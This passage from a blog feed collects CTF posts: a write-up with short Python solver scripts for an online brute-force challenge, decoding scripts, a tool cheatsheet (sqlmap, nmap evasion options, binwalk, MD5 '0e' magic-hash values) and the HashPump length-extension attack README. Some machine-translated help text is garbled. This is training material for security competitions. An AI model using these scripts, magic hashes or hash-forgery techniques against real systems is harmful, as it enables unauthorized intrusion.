= <span class="string">"http://17fab28ee29e482a95e9cca3fa1dcb111d918b722e404654.game.ichunqiu.com/?value[]=ea"</span></span><br><span class="line">al = [<span class="string">'abcdefghijklmnopqrstuvwxyz'</span>]</span><br><span class="line">s = requests.session()</span><br><span class="line">r = s.get(url)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(20):</span><br><span class="line">    url = <span class="string">"http://17fab28ee29e482a95e9cca3fa1dcb111d918b722e404654.game.ichunqiu.com/?value[]="</span> + r.content[0:2]</span><br><span class="line">    r = s.get(url)</span><br><span class="line">    <span class="built_in">print</span> r.content</span><br><span class="line">输出的r.content中就有flag</span><br></pre></td></tr></table></figure><h1 id="“百度杯”CTF比赛-2017-二月场-爆破-3"><a href="#“百度杯”CTF比赛-2017-二月场-爆破-3" class="headerlink" title="“百度杯”CTF比赛 2017 二月场-爆破-3"></a>“百度杯”CTF比赛 2017 二月场-爆破-3</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">pf &lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">session_start();</span><br><span class="line">require(<span class="string">'./flag.php'</span>);</span><br><span class="line"><span class="keyword">if</span>(!isset(<span class="variable">$_SESSION</span>[<span class="string">'nums'</span>]))&#123;</span><br><span class="line">  <span class="variable">$_SESSION</span>[<span class="string">'nums'</span>] = 0;</span><br><span class="line">  <span class="variable">$_SESSION</span>[<span class="string">'time'</span>] = time();</span><br><span class="line">  <span class="variable">$_SESSION</span>[<span class="string">'whoami'</span>] = <span class="string">'ea'</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SESSION</span>[<span class="string">'time'</span>]+120&lt;time())&#123;</span><br><span class="line">  session_destroy();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$value</span> = <span class="variable">$_REQUEST</span>[<span class="string">'value'</span>];</span><br><span class="line"><span class="variable">$str_rand</span> = range(<span class="string">'a'</span>, <span class="string">'z'</span>);</span><br><span class="line"><span class="variable">$str_rands</span> = <span class="variable">$str_rand</span>[mt_rand(0,25)].<span class="variable">$str_rand</span>[mt_rand(0,25)];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SESSION</span>[<span class="string">'whoami'</span>]==(<span class="variable">$value</span>[0].<span class="variable">$value</span>[1]) &amp;&amp; substr(md5(<span class="variable">$value</span>),5,4)==0)&#123;</span><br><span class="line">  <span class="variable">$_SESSION</span>[<span class="string">'nums'</span>]++;</span><br><span class="line">  <span class="variable">$_SESSION</span>[<span class="string">'whoami'</span>] = <span class="variable">$str_rands</span>;</span><br><span class="line">  <span class="built_in">echo</span> <span class="variable">$str_rands</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SESSION</span>[<span class="string">'nums'</span>]&gt;=10)&#123;</span><br><span class="line">  <span class="built_in">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">show_source(__FILE__);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h2 id="爆破脚本"><a href="#爆破脚本" class="headerlink" title="爆破脚本"></a>爆破脚本</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">url=<span class="string">'http://a8e37458b4314a97927685e5caf1dd6a6dcb5cecf40248da.game.ichunqiu.com/'</span></span><br><span class="line">session=requests.Session()</span><br><span class="line">html=session.get(url+<span class="string">'?value[0]=e&amp;value[1]=a'</span>).text</span><br><span class="line"><span class="built_in">print</span> html</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(10):</span><br><span class="line">    html=session.get(url+<span class="string">'?value[]='</span>+html[0:2]).text</span><br><span class="line">    <span class="built_in">print</span> html[0:2]</span><br><span class="line">    <span class="comment">#print html</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">'flag&#123;.*&#125;'</span> <span class="keyword">in</span> html:</span><br><span class="line">        <span class="built_in">break</span></span><br><span class="line"><span class="built_in">print</span> (html)</span><br></pre></td></tr></table></figure>]]></content>
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Python运行错误及解决方案汇总</title>
      <link href="/2018/08-27-python-error.html"/>
      <url>/2018/08-27-python-error.html</url>
      <content type="html"><![CDATA[<h2 id="python2-7运行出现的Unicode-equal-comparison-failed-to-convert-both-arguments-to-Unicode-interpreting"><a href="#python2-7运行出现的Unicode-equal-comparison-failed-to-convert-both-arguments-to-Unicode-interpreting" class="headerlink" title="python2.7运行出现的Unicode equal comparison failed to convert both arguments to Unicode - interpreting"></a>python2.7运行出现的Unicode equal comparison failed to convert both arguments to Unicode - interpreting</h2><p>uncode编码警告：在unicode等价比较中，把两个参数同时转换为unicode编码失败。中断并认为他们不相等。<br>windows下的字符串str默认编码是ascii，而python编码是utf8<br>解决方法：添加如下几行代码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">import sys</span><br><span class="line">reload(sys)</span><br><span class="line">sys.setdefaultencoding(<span class="string">'utf8'</span>)</span><br></pre></td></tr></table></figure>]]></content>
      
      <categories>
          
          <category> problem-solution </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>CTF常用python脚本</title>
      <link href="/2018/08-25-decode-script.html"/>
      <url>/2018/08-25-decode-script.html</url>
      <content type="html"><![CDATA[<h1 id="加解密脚本"><a href="#加解密脚本" class="headerlink" title="加解密脚本"></a>加解密脚本</h1><h2 id="n次base64解密"><a href="#n次base64解密" class="headerlink" title="n次base64解密"></a>n次base64解密</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">import base64</span><br><span class="line">    a = open(<span class="string">'1.txt'</span>)</span><br><span class="line">    try:</span><br><span class="line">        b = a.read()</span><br><span class="line">    finally:</span><br><span class="line">        a.close()</span><br><span class="line">    <span class="keyword">while</span> True:</span><br><span class="line">        try:</span><br><span class="line">            b = base64.b64decode(b)</span><br><span class="line">        except:</span><br><span class="line">            <span class="built_in">print</span>(b)</span><br><span class="line">            <span class="built_in">break</span></span><br></pre></td></tr></table></figure><h2 id="RC4解密算法"><a href="#RC4解密算法" class="headerlink" title="RC4解密算法"></a>RC4解密算法</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">import random, base64</span><br><span class="line">from hashlib import sha1</span><br><span class="line">def crypt(data, key):</span><br><span class="line">   x = 0</span><br><span class="line">   box = range(256)</span><br><span class="line">   <span class="keyword">for</span> i <span class="keyword">in</span> range(256):</span><br><span class="line">       x = (x + box[i] + ord(key[i % len(key)])) % 256</span><br><span class="line">       box[i], box[x] = box[x], box[i]</span><br><span class="line">   x = y = 0</span><br><span class="line">   out = []</span><br><span class="line">   <span class="keyword">for</span> char <span class="keyword">in</span> data:</span><br><span class="line">       x = (x + 1) % 256</span><br><span class="line">       y = (y + box[x]) % 256</span><br><span class="line">       box[x], box[y] = box[y], box[x]</span><br><span class="line">       out.append(chr(ord(char) ^ box[(box[x] + box[y]) % 256]))</span><br><span class="line">   <span class="built_in">return</span> <span class="string">''</span>.join(out)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def tdecode(data, key, decode=base64.b64decode, salt_length=16):</span><br><span class="line">   <span class="keyword">if</span> decode:</span><br><span class="line">       data = decode(data)</span><br><span class="line">   salt = data[:salt_length]</span><br><span class="line">   <span class="built_in">return</span> crypt(data[salt_length:], sha1(key + salt).digest())</span><br><span class="line"><span class="keyword">if</span> __name__ ==<span class="string">'__main__'</span>:</span><br><span class="line">   data = <span class="string">'UUyFTj8PCzF6geFn6xgBOYSvVTrbpNU4OF9db9wMcPD1yDbaJw =='</span></span><br><span class="line">   key = <span class="string">'welcometoicqedu'</span></span><br><span class="line">   decoded_data = tdecode(data=data, key=key)</span><br><span class="line">   <span class="built_in">print</span> decoded_data</span><br></pre></td></tr></table></figure>]]></content>
      
      <categories>
          
          <category> Programming </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>CTF Tools</title>
      <link href="/2018/08-25-CTF-Tools-online.html"/>
      <url>/2018/08-25-CTF-Tools-online.html</url>
      <content type="html"><![CDATA[<h1 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h1><h2 id="sqlmap"><a href="#sqlmap" class="headerlink" title="sqlmap"></a>sqlmap</h2><p>数据所在<br>rm -rf  /root/.sqlmap/output/192.168.11.200</p><h2 id="爆破后台目录"><a href="#爆破后台目录" class="headerlink" title="爆破后台目录"></a>爆破后台目录</h2><p><a href="https://github.com/LangziFun/scan-backup-langzi-" target="_blank" rel="noopener">https://github.com/LangziFun/scan-backup-langzi-</a></p><h2 id="svn文件修复"><a href="#svn文件修复" class="headerlink" title="svn文件修复"></a>svn文件修复</h2><p><a href="https://github.com/kost/dvcs-ripper" target="_blank" rel="noopener">https://github.com/kost/dvcs-ripper</a></p><h1 id="wireshark数据包"><a href="#wireshark数据包" class="headerlink" title="wireshark数据包"></a>wireshark数据包</h1><h2 id="X-Forwarded-For的IP伪造"><a href="#X-Forwarded-For的IP伪造" class="headerlink" title="X-Forwarded-For的IP伪造"></a>X-Forwarded-For的IP伪造</h2><h2 id="tcpflow"><a href="#tcpflow" class="headerlink" title="tcpflow"></a>tcpflow</h2><p>kali linux自带的工具，可以提取wireshark中的数据。</p><h2 id="binwalk"><a href="#binwalk" class="headerlink" title="binwalk"></a>binwalk</h2><p>Binwalk v2.1.1<br>克雷格·凯西,<a href="http://www.binwalk.org" target="_blank" rel="noopener">http://www.binwalk.org</a><br>用法:binwalk [OPTIONS] [FILE1] [FILE2] [FILE3]…<br>签名扫描选项:<br>-B， -签名扫描目标文件，寻找通用文件签名<br>-R， -raw=<str>为指定的字节序列扫描目标文件<br>-A， -操作码扫描目标文件以获得通用可执行操作码签名<br>-m， -magic=<file>指定要使用的自定义魔术文件<br>-b， -哑禁用智能签名关键字<br>-I，——无效显示标记为无效的结果<br>-x， -exclude=<str>排除与<str>匹配的结果<br>-y，—include=<str>只显示匹配<str>的结果<br>提取选项:<br>-e， -提取自动提取已知文件类型<br>-D， -dd=<a href="type:ext:cmd" target="_blank" rel="noopener">type:ext:cmd</a>提取<type>签名，给文件一个扩展名<ext>，并执行<cmd><br>-M， -matryoshka递归扫描提取的文件<br>-d， -depth=<int>极限matryoshka递归深度(默认:8层深度)<br>-C， -directory=<str>将文件/文件夹提取到自定义目录(默认:当前工作目录)<br>-j， -size=<int>限制每个提取文件的大小<br>-n， -count=<int>限制提取文件的数量<br>-r， -rm删除被雕刻的文件后提取<br>-z，——从文件中雕刻数据，但不要执行提取实用程序<br>熵分析选项:<br>-E， -熵计算文件熵<br>-F，快速使用更快，但不太详细，熵分析<br>保存为PNG<br>-Q， -nlegend省略了熵图中的传说<br>-N， -nplot不会生成熵图<br>-H，——high=<float>设置上升边缘熵触发阈值(默认:0.95)<br>-L，——low=<float>设置下降边缘熵触发阈值(默认:0.85)<br>二进制dif选项:<br>-W， -hexdump执行一个或多个文件的hexdump / diff<br>-G，——绿色只显示包含所有文件中相同字节的行<br>-我，-红色只显示包含不同于所有文件的字节的行<br>-U， -蓝色只显示包含不同文件的字节的行<br>-w， -简洁区分所有文件，但只显示第一个文件的十六进制转储<br>原始压缩选项:<br>-X， -放气扫描原始放气压缩流<br>lzma扫描原始lzma压缩流<br>-P，局部扫描，表面扫描，但速度更快<br>-S， -在第一个结果后停止<br>一般选择:<br>-l， -length=<int>要扫描的字节数<br>-o， -offset=<int>开始扫描在这个文件偏移量<br>-O， -base=<int>为所有打印的偏移量添加一个基地址<br>-K， -block=<int>设置文件块大小<br>-g， -swap=<int>在扫描前反转每n个字节<br>-f， -log=<file>记录结果到文件<br>-c， -csv日志结果以csv格式文件<br>-t——术语格式输出，以适应终端窗口<br>-q，——安静抑制输出到stdout<br>-v，——详细启用详细输出<br>-h， -帮助显示帮助输出<br>-a， -finclude=<str>只扫描名称与此正则表达式匹配的文件<br>不扫描名称与此正则表达式匹配的文件<br>在指定的端口上启用状态服务器</str></file></int></int></int></int></int></float></float></int></int></str></int></cmd></ext></type></str></str></str></str></file></str></p><h2 id="namp"><a href="#namp" class="headerlink" title="namp"></a>namp</h2><h3 id="nmap下载"><a href="#nmap下载" class="headerlink" title="nmap下载"></a>nmap下载</h3><p><a href="http://www.nmap.com.cn/" target="_blank" rel="noopener">http://www.nmap.com.cn/</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line">用法：nmap [扫描类型] [选项] &#123;目标规范&#125;</span><br><span class="line">目标规范：</span><br><span class="line">可以传递主机名，IP地址，网络等。</span><br><span class="line">例如：scanme.nmap.org，microsoft.com / 24,192.168.0.1; 10.0-255.0-255.1-254</span><br><span class="line">-iL &lt;inputfilename&gt;：从主机/网络列表输入</span><br><span class="line">-iR &lt;num hosts&gt;：选择随机目标</span><br><span class="line">--exclude &lt;host1 [，host2] [，host3]，...&gt;：排除hosts / networks</span><br><span class="line">--excludefile &lt;exclude_file&gt;：从文件中排除列表</span><br><span class="line">HOST DISCOVERY：</span><br><span class="line">-sL：列表扫描 - 只列出要扫描的目标</span><br><span class="line">-sP：Ping扫描 - 只需确定主机是否在线</span><br><span class="line">-P0：将所有主机视为在线 - 跳过主机发现</span><br><span class="line">-PS / PA / PU [端口</span><br><span class="line">列表]：给定端口的TCP SYN / ACK或UDP发现探测-PE / PP / PM：ICMP回送，时间戳和网络掩码请求发现探测</span><br><span class="line">-n / -R：永远不要进行DNS解析/始终解析[默认：有时解析]</span><br><span class="line">SCAN TECHNIQUES：</span><br><span class="line">-sS / sT / sA / sW / sM：TCP SYN / Connect（）/ ACK / Window / Maimon扫描</span><br><span class="line">-sN / sF / sX：TCP Null，FIN和Xmas扫描</span><br><span class="line">- -scanflags &lt;flags&gt;：自定义TCP扫描标志</span><br><span class="line">-sI &lt;zombie host [：probeport]&gt;：Idlescan</span><br><span class="line">-sO：IP协议扫描</span><br><span class="line">-b &lt;ftp relay host&gt;：FTP跳出扫描</span><br><span class="line">端口规格和扫描顺序：-p</span><br><span class="line">&lt;端口范围&gt;：仅扫描指定的端口</span><br><span class="line">Ex：-p22; -p1-65535; -p U：53,111,137，T：21-25,80,139,8080</span><br><span class="line">-F：快速 - 仅扫描nmap-services文件中列出的端口）</span><br><span class="line">-r：连续扫描端口 - 不随机化</span><br><span class="line">SERVICE / VERSION DETECTION：</span><br><span class="line">-sV：探测打开端口以确定服务/版本信息</span><br><span class="line">--version-light ：限制为最可能的探测器以便更快识别</span><br><span class="line">--version-all：尝试每个探测器进行版本检测</span><br><span class="line">--version-trace：显示详细的版本扫描活动（用于调试）</span><br><span class="line">OS检测：</span><br><span class="line">-O：启用OS检测</span><br><span class="line">--osscan-限制：将OS检测限制为有希望的目标</span><br><span class="line">--osscan-guess：更积极地猜测操作系统</span><br><span class="line">时间和性能：</span><br><span class="line">-T [0-6]：设置时序模板（更高更快）</span><br><span class="line">--min-hostgroup / max-hostgroup &lt;msec&gt;：并行主机扫描组大小</span><br><span class="line">--min-parallelism / max-parallelism &lt;msec&gt;：探测并行化</span><br><span class="line">--min-rtt-timeout / max-rtt-timeout / initial-rtt -timeout &lt;msec&gt;：指定</span><br><span class="line">探测往返时间。</span><br><span class="line">--host-timeout &lt;msec&gt;：在此长时间后放弃目标</span><br><span class="line">--scan-delay / - max-scan-delay &lt;msec&gt;：调整探测器之间的延迟</span><br><span class="line">防火墙/ IDS逃逸和施法：</span><br><span class="line">-f; --mtu &lt;val&gt;：片段包（可选择w /给定MTU）</span><br><span class="line">-D &lt;decoy1，decoy2 [，ME]，...&gt;：用decoys</span><br><span class="line">-S &lt;IP_Address&gt; 披露扫描：欺骗源地址</span><br><span class="line">-e &lt;iface &gt;：使用指定的接口</span><br><span class="line">-g / - <span class="built_in">source</span>-port &lt;portnum&gt;：</span><br><span class="line">--data-length &lt;num&gt;：将随机数据附加到已发送的数据包</span><br><span class="line">--ttl &lt;val&gt;：设置IP生存时间字段</span><br><span class="line">--spoof-mac &lt;mac地址，前缀或供应商名称&gt;：欺骗您的MAC地址</span><br><span class="line">OUTPUT：</span><br><span class="line">-oN / -oX / -oS / -oG &lt;file&gt;：输出扫描</span><br><span class="line">分别生成给定文件名的普通，XML，s | &lt;rIpt kIddi3 和Grepable格式。</span><br><span class="line">-oA &lt;basename&gt;：一次输出三种主要格式</span><br><span class="line">-v：增加详细级别（使用两次以获得更多效果）</span><br><span class="line">-d [level]：设置或增加调试级别（最多9个是有意义的） -</span><br><span class="line">packet-trace ：显示发送和接收的所有数据包</span><br><span class="line">--iflist：打印主机接口和路由（用于调试）</span><br><span class="line">--append-output：追加而不是clobber指定的输出文件</span><br><span class="line">--resume &lt;filename&gt;：恢复中止扫描</span><br><span class="line">--stylesheet &lt;path / URL&gt;：XSL样式表将XML输出转换为HTML</span><br><span class="line">--no-stylesheet：Prevent Nmap从关联XSL样式表到XML输出</span><br><span class="line">MISC：</span><br><span class="line">-6：启用IPv6扫描</span><br><span class="line">-A：启用OS检测和版本检测</span><br><span class="line">--datadir &lt;dirname&gt;：指定自定义Nmap数据文件位置</span><br><span class="line">--send-eth / - send-ip：使用原始以太网帧或IP数据包发送数据包</span><br><span class="line">--privileged：假设用户具有完全权限</span><br><span class="line">-V：打印版本号</span><br><span class="line">-h：打印此帮助摘要页面。</span><br><span class="line">例子：</span><br><span class="line">nmap -v -A scanme.nmap.org</span><br><span class="line">nmap -v -sP 192.168.0.0/16 10.0.0.0/8</span><br><span class="line">nmap -v -iR 10000 -P0 -p 80</span><br></pre></td></tr></table></figure><h1 id="各种工具集合"><a href="#各种工具集合" class="headerlink" title="各种工具集合"></a>各种工具集合</h1><p>1.<a href="http://tool.bugku.com/" target="_blank" rel="noopener">http://tool.bugku.com/</a></p><h2 id="js在线测试"><a href="#js在线测试" class="headerlink" title="js在线测试"></a>js在线测试</h2><p><a href="http://www.w3school.com.cn/tiy/t.asp?f=jseg_isNaN" target="_blank" rel="noopener">http://www.w3school.com.cn/tiy/t.asp?f=jseg_isNaN</a></p><h1 id="编码解码类"><a href="#编码解码类" class="headerlink" title="编码解码类"></a>编码解码类</h1><h2 id="xx加解密"><a href="#xx加解密" class="headerlink" title="xx加解密"></a>xx加解密</h2><p><a href="http://web.chacuo.net/charsetxxencode/" target="_blank" rel="noopener">http://web.chacuo.net/charsetxxencode/</a></p><h2 id="fastcoll（MD5-碰撞发生器）"><a href="#fastcoll（MD5-碰撞发生器）" class="headerlink" title="fastcoll（MD5 碰撞发生器）"></a>fastcoll（MD5 碰撞发生器）</h2><p>Allowed options:<br>  -h [ –help ]           显示选项。<br>  -q [ –quiet ]          更简洁。<br>  -i [ –ihv ] arg        使用指定的初始值。默认是MD5的初始值。<br>  -p [ –prefixfile ] arg 使用给定前缀的文件计算初始值，并复制数据到输出文件。<br>  -o [ –out ] arg        设置输出文件名. 这必须是最后的选项，并且必须指定两个文件名。<br>                          默认: -o msg1.bin msg2.bin</p><h2 id="md5加解密"><a href="#md5加解密" class="headerlink" title="md5加解密"></a>md5加解密</h2><p>注意：md5是16进制32位数字<br><a href="http://www.cmd5.com/" target="_blank" rel="noopener">http://www.cmd5.com/</a></p><h2 id="开头为0的md5值总结"><a href="#开头为0的md5值总结" class="headerlink" title="开头为0的md5值总结"></a>开头为0的md5值总结</h2><p>s878926199a<br>0e545993274517709034328855841020<br>s155964671a<br>0e342768416822451524974117254469<br>s214587387a<br>0e848240448830537924465865611904<br>s214587387a<br>0e848240448830537924465865611904<br>s878926199a<br>0e545993274517709034328855841020<br>s1091221200a<br>0e940624217856561557816327384675<br>s1885207154a<br>0e509367213418206700842008763514<br>s1502113478a<br>0e861580163291561247404381396064<br>s1885207154a<br>0e509367213418206700842008763514<br>s1836677006a<br>0e481036490867661113260034900752<br>s155964671a<br>0e342768416822451524974117254469<br>s1184209335a<br>0e072485820392773389523109082030<br>s1665632922a<br>0e731198061491163073197128363787<br>s1502113478a<br>0e861580163291561247404381396064<br>s1836677006a<br>0e481036490867661113260034900752<br>s1091221200a<br>0e940624217856561557816327384675<br>s155964671a<br>0e342768416822451524974117254469<br>s1502113478a<br>0e861580163291561247404381396064<br>s155964671a<br>0e342768416822451524974117254469<br>s1665632922a<br>0e731198061491163073197128363787<br>s155964671a<br>0e342768416822451524974117254469<br>s1091221200a<br>0e940624217856561557816327384675<br>s1836677006a<br>0e481036490867661113260034900752<br>s1885207154a<br>0e509367213418206700842008763514<br>s532378020a<br>0e220463095855511507588041205815<br>s878926199a<br>0e545993274517709034328855841020<br>s1091221200a<br>0e940624217856561557816327384675<br>s214587387a<br>0e848240448830537924465865611904<br>s1502113478a<br>0e861580163291561247404381396064<br>s1091221200a<br>0e940624217856561557816327384675<br>s1665632922a<br>0e731198061491163073197128363787<br>s1885207154a<br>0e509367213418206700842008763514<br>s1836677006a<br>0e481036490867661113260034900752<br>s1665632922a<br>0e731198061491163073197128363787<br>s878926199a<br>0e545993274517709034328855841020</p><h2 id="词频统计"><a href="#词频统计" class="headerlink" title="词频统计"></a>词频统计</h2><p><a href="https://quipqiup.com/" target="_blank" rel="noopener">https://quipqiup.com/</a></p>]]></content>
      
      <categories>
          
          <category> Document </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>HashPump用户手册</title>
      <link href="/2018/08-16-HashPump.html"/>
      <url>/2018/08-16-HashPump.html</url>
      <content type="html"><![CDATA[<h1 id="HashPump"><a href="#HashPump" class="headerlink" title="HashPump"></a>HashPump</h1><p>在各种散列算法中利用散列长度扩展攻击的工具。<br>目前支持的算法：MD5、SHA1、SHA256、SHA512。</p><h2 id="Help-Menu"><a href="#Help-Menu" class="headerlink" title="Help Menu"></a>Help Menu</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$ hashpump -h</span><br><span class="line">HashPump [-h <span class="built_in">help</span>] [-t <span class="built_in">test</span>] [-s signature] [-d data] [-a additional] [-k keylength]</span><br><span class="line">    HashPump generates strings to exploit signatures vulnerable to the Hash Length Extension Attack.</span><br><span class="line">    -h --<span class="built_in">help</span>          Display this message.</span><br><span class="line">    -t --<span class="built_in">test</span>          Run tests to verify each algorithm is operating properly.</span><br><span class="line">    -s --signature     The signature from known message.</span><br><span class="line">    -d --data          The data from the known message.</span><br><span class="line">    -a --additional    The information you would like to add to the known message.</span><br><span class="line">    -k --keylength     The length <span class="keyword">in</span> bytes of the key being used to sign the original message with.</span><br><span class="line">    Version 1.2.0 with CRC32, MD5, SHA1, SHA256 and SHA512 support.</span><br><span class="line">    &lt;Developed by bwall(@botnet_hunter)&gt;</span><br></pre></td></tr></table></figure><h2 id="Sample-Output"><a href="#Sample-Output" class="headerlink" title="Sample Output"></a>Sample Output</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ hashpump -s <span class="string">'6d5f807e23db210bc254a28be2d6759a0f5f5d99'</span> --data <span class="string">'count=10&amp;lat=37.351&amp;user_id=1&amp;long=-119.827&amp;waffle=eggo'</span> -a <span class="string">'&amp;waffle=liege'</span> -k 14</span><br><span class="line">0e41270260895979317fff3898ab85668953aaa2</span><br><span class="line">count=10&amp;lat=37.351&amp;user_id=1&amp;long=-119.827&amp;waffle=eggo\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02(&amp;waffle=liege</span><br></pre></td></tr></table></figure><h2 id="Compile-amp-install"><a href="#Compile-amp-install" class="headerlink" title="Compile &amp; install"></a>Compile &amp; install</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ git <span class="built_in">clone</span> https://github.com/bwall/HashPump.git</span><br><span class="line">$ apt-get install g++ libssl-dev</span><br><span class="line">$ <span class="built_in">cd</span> HashPump</span><br><span class="line">$ make</span><br><span class="line">$ make install</span><br></pre></td></tr></table></figure><p><code>apt-get</code> and <code>make install</code> require root privileges to run correctly.  The actual requirement is for <code>-lcrypto</code>, so depending on your operating system, your dependencies may vary.</p><p>On OS X HashPump can also be installed using <a href="http://brew.sh/" target="_blank" rel="noopener">Homebrew</a>:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ brew install hashpump</span><br></pre></td></tr></table></figure><h2 id="Mentions"><a href="#Mentions" class="headerlink" title="Mentions"></a>Mentions</h2><p>HashPump has been mentioned in a few write-ups.  If you are wondering how you can use HashPump, these are some great examples.</p><ul><li><a href="http://ctfcrew.org/writeup/54" target="_blank" rel="noopener">http://ctfcrew.org/writeup/54</a></li><li><a href="http://d.hatena.ne.jp/kusano_k/20140310/1394471922" target="_blank" rel="noopener">http://d.hatena.ne.jp/kusano_k/20140310/1394471922</a> (JP)</li><li><a href="http://conceptofproof.wordpress.com/2014/04/13/plaidctf-2014-web-150-mtgox-writeup/" target="_blank" rel="noopener">http://conceptofproof.wordpress.com/2014/04/13/plaidctf-2014-web-150-mtgox-writeup/</a></li><li><a href="http://achatz.me/plaid-ctf-mt-pox/" target="_blank" 